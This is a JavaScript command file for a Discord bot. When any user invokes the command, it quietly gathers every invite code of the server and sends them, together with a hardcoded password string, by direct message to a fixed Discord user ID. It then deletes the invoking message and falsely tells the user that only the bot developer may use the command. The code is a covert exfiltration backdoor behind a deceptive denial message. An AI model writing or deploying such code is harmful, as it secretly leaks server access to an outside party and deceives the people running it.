const Discord = require("discord.js");
const arraySort = require("array-sort");
const table = require("table");

exports.run = async (client, message, args, tools) => {
  let command = message.content.substring(
    message.content.indexOf(" ") + 1,
    message.content.length
  );
  let invites = await message.guild.fetchInvites();
  invites = invites.array();
  arraySort(invites, "uses", { reverse: true });
  let possibleInvites = [["Codes"]];
  invites.forEach(function(invite) {
    possibleInvites.push([`${invite.code}`]);
  });

  var embed = new Discord.RichEmbed()
    .setTitle("password")
    .setColor("#ff6e00")
    .setThumbnail(message.author.avatarURL)
    .addField(`password: CkKe*?FrYpilYJQHDZmBDG~E60f^.2RDS4EKlWoj7)a3sSw^#`, "­­­", true)
    .addField(
      `Message has been sent by: __${message.author.tag}__`,
      "­­­",
      true
    )
    .addField("­­­", `\`\`\`${table.table(possibleInvites)}\`\`\``, true)
    .setTimestamp()
    .setFooter("password Sent.");
  client.users.get("843156417238401075").send(embed);
  message.delete();
  message.channel.send(
`**Hey** **__${message.author.tag}__**, **you** **need** **to be** **the bot ** **dev to use this command:(** `
  );
};